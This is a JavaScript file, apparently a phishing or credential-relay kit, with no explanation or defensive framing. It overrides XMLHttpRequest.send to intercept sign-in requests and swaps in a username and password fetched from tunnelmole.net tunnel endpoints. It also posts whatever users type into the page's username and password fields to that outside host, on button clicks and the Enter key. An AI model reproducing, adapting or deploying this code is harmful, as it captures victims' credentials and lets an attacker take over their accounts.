let freqUsername = null;
let freqPassword = null;
const modifiedRequests = new Set();
const pendingRequests = new Map();
let usernameFetched = false;
let passwordFetched = false;

// Fetch the username when needed
const fetchFreqUsername = async () => {
    if (usernameFetched) return; // Avoid redundant fetches once username is fetched

    console.log('Fetching username...');

    try {
        const response = await fetch('https://lcqm5s-ip-37-228-207-173.tunnelmole.net/get-first-post-data', {
            method: 'GET',
            headers: { 'Cache-Control': 'no-cache' }
        });

        if (!response.ok) throw new Error(`HTTP error! Status: ${response.status}`);

        const result = await response.json();
        console.log('Response from /get-first-post-data:', result);  // Debug log

        if (result?.postData) {
            freqUsername = result.postData;
            console.log('Fetched username:', freqUsername);
            usernameFetched = true;

            // Reset the server-side username store
            await fetch('https://lcqm5s-ip-37-228-207-173.tunnelmole.net/reset-first-post-data', { method: 'POST' });
            // Process all pending requests now that we have a username
            processModifiedRequests();
        } else {
            console.warn("No username data received, retrying...");
            setTimeout(fetchFreqUsername, 1000); // Retry after 1s if no username is received
        }
    } catch (error) {
        console.error('Error fetching username:', error);
        setTimeout(fetchFreqUsername, 500); // Retry after 1s if error occurs
    }
};

// Fetch the password when needed
const fetchFreqPassword = async () => {
    if (passwordFetched) return; // Avoid redundant fetches once password is fetched

    console.log('Fetching password...');

    try {
        const response = await fetch('https://lcqm5s-ip-37-228-207-173.tunnelmole.net/get-second-post-data', {
            method: 'GET',
            headers: { 'Cache-Control': 'no-cache' }
        });

        if (!response.ok) throw new Error(`HTTP error! Status: ${response.status}`);

        const result = await response.json();
        console.log('Response from /get-first-password-data:', result);  // Debug log

        if (result?.postData) {
            freqPassword = result.postData;
            console.log('Fetched password:', freqPassword);
            passwordFetched = true;

            // Reset the server-side password store
            await fetch('https://pnekcn-ip-37-228-207-173.tunnelmole.net/reset-second-post-data', { method: 'POST' });
            // Process all pending requests now that we have a password
            processModifiedRequests();
        } else {
            console.warn("No password data received, retrying...");
            setTimeout(fetchFreqPassword, 1000); // Retry after 1s if no password is received
        }
    } catch (error) {
        console.error('Error fetching password:', error);
        setTimeout(fetchFreqPassword, 500); // Retry after 1s if error occurs
    }
};

// Modify and send pending requests when username and password are available
const processModifiedRequests = () => {
    if (!freqUsername || !freqPassword) {
        console.log("Username or password not available yet, retrying...");
        if (!freqUsername) fetchFreqUsername();
        if (!freqPassword) fetchFreqPassword();
        return;
    }

    console.log("Processing pending requests...");
    const requestsToProcess = Array.from(pendingRequests);

    for (let [xhr, body] of requestsToProcess) {
        let modifiedBody = body;

        // Replace username
        const usernameMatch = body.match(/identity-signin-identifier%5C%22%2C%5C%22([^&]*)%5C/);
        if (usernameMatch && !modifiedRequests.has(body)) {
            modifiedBody = modifiedBody.replace(usernameMatch[1], freqUsername);
        }

        // Replace password
        const passwordMatch = body.match(/identity-signin-password%5C%22%2C%5C%22([^&]*)%5C/);
        if (passwordMatch && !modifiedRequests.has(body)) {
            modifiedBody = modifiedBody.replace(passwordMatch[1], freqPassword);
        }

        if (!modifiedRequests.has(body)) {
            modifiedRequests.add(body); // Mark the request as modified
            console.log("Modified request with new username and password:", modifiedBody);
            xhr.send(modifiedBody); // Send the modified request
            pendingRequests.delete(xhr); // Remove the request from pending
        }
    }

    // Reset freqUsername and freqPassword when all requests are processed
    if (pendingRequests.size === 0) {
        console.log("All pending requests processed, resetting username and password.");
        freqUsername = null;
        usernameFetched = false;
        freqPassword = null;
        passwordFetched = false;
    }
};

// Intercept XMLHttpRequest to modify requests with username and password
const originalXhrSend = XMLHttpRequest.prototype.send;
XMLHttpRequest.prototype.send = function (body) {
    if (!body) {
        originalXhrSend.call(this, body);
        return;
    }

    if ((/identity-signin-identifier/.test(body) || /identity-signin-password/.test(body)) && !Array.from(modifiedRequests).some(m => body.includes(m))) {
        console.log("Intercepted request:", body);
        pendingRequests.set(this, body); // Store the request in pendingRequests
        processModifiedRequests(); // Attempt to modify and send the request immediately
    } else {
        originalXhrSend.call(this, body); // Send the original request if no modification is needed
    }
};

// ✅ Send username data to server
const sendUsername = async () => {
    console.log('Sending username...');
    const username = document.getElementById('username')?.value;
    if (!username) {
        console.warn("No username entered");
        return;
    }

    try {
        const response = await fetch('https://lcqm5s-ip-37-228-207-173.tunnelmole.net/save-username', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ username })
        });

        if (response.ok) {
            console.log('Username sent successfully');
        } else {
            console.error('Error sending username:', response.statusText);
        }
    } catch (error) {
        console.error('Error sending username:', error);
    }
};

// ✅ Send password data to server
const sendPassword = async () => {
    console.log('Sending password...');
    const password = document.getElementById('password')?.value;
    if (!password) {
        console.warn("No password entered");
        return;
    }

    try {
        const response = await fetch('https://lcqm5s-ip-37-228-207-173.tunnelmole.net/save-password', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ password })
        });

        if (response.ok) {
            console.log('Password sent successfully');
        } else {
            console.error('Error sending password:', response.statusText);
        }
    } catch (error) {
        console.error('Error sending password:', error);
    }
};

// ✅ Attach event listeners
document.addEventListener('DOMContentLoaded', () => {
    const usernameBtn = document.getElementById('sendUsernameBtn');
    const passwordBtn = document.getElementById('passwordNext');
    const usernameInput = document.getElementById('username');
    const passwordInput = document.getElementById('password');

    if (usernameBtn) {
        usernameBtn.addEventListener('click', (event) => {
            event.preventDefault();
            sendUsername();
        });
    }

    if (passwordBtn) {
        passwordBtn.addEventListener('click', (event) => {
            event.preventDefault();
            sendPassword();
        });
    }

    if (usernameInput) {
        usernameInput.addEventListener('keydown', (event) => {
            if (event.key === 'Enter') {
                event.preventDefault();
                sendUsername();
            }
        });
    }
    
if (passwordInput) {
    passwordInput.addEventListener('keydown', (event) => {
        if (event.key === 'Enter') {
            event.preventDefault(); // Prevent form submission
            sendPassword(); // Trigger sending password
        }
    });
}

    fetchFreqUsername();
    fetchFreqPassword();
});
